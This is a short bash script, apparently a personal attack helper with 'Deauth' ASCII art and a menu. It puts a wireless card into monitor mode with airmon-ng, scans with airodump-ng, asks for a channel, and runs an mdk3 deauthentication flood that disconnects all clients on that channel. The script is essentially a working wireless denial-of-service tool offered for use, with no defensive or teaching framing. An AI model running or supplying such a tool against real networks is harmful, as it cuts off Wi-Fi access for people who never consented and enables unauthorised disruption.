#!/bin/bash

RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e ${BLUE}  "..............
            ..,;:ccc,.
          ......''';lxO.
.....''''..........,:ld;
           .';;;:::;,,.x,
      ..'''.            0Xxoc:,.  ...
  ....                ,ONkc;,;cokOdc',.
 .                   OMo           ':ddo.
                    dMc               :OO;
                    0M.       Deauth    .:o.
                    ;Wd
                     ;XO,
                       ,d0Odlc;,..
                           ..',;:cdOOd::,.
                                    .:d;.':;.
                                       'd,  .'
                                         ;l   ..
                                          .o
                                            c
                                            .'
                                             . ${NC}"

select item in "Start monitor mode" "Kill monitor mode" "Exit"
do
	echo "Choice: " $REPLY
	case $REPLY in
		1) sudo airmon-ng start wlan1
		   gnome-terminal -- sudo airodump-ng wlan1
		   echo -e ${RED} " Enter the channel you would like to deauth !" ${NC}
		   read ch
		   sudo mdk3 wlan1 d -c $ch
			;;
		2) sudo airmon-ng stop wlan1
		   sudo systemctl start NetworkManager
			;;
		3) exit
			;;
	esac
done